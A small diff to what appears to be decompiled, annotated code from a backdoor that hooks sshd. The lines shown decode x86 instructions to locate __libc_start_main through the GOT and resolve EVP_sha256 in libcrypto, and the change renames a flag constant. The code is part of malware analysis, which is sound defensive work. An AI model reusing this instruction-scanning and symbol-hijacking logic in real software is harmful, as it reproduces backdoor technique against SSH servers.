@@ -95,7 +95,7 @@ BOOL sshd_find_main_from_entry_stub
                    // AutoDoc: The capture is only valid when the very next CALL targets `__libc_start_main@GOT` via the same register.
                    (insn_ctx.opcode_window.opcode_window_dword == X86_OPCODE_1B_GRP5)) &&
                   (((uint)insn_ctx.prefix.decoded.modrm >> 8 == 0x50200 &&
-                   (((insn_ctx.prefix.decoded.flags2 & 1) != 0 &&
+                   (((insn_ctx.prefix.decoded.flags2 & DF2_MEM_DISP) != 0 &&
                     (libc_start_main_got == insn_ctx.instruction + insn_ctx.instruction_size + insn_ctx.mem_disp)
                     ))))) {
             symbol_entry = elf_gnu_hash_lookup_symbol(libcrypto,STR_EVP_sha256,0);
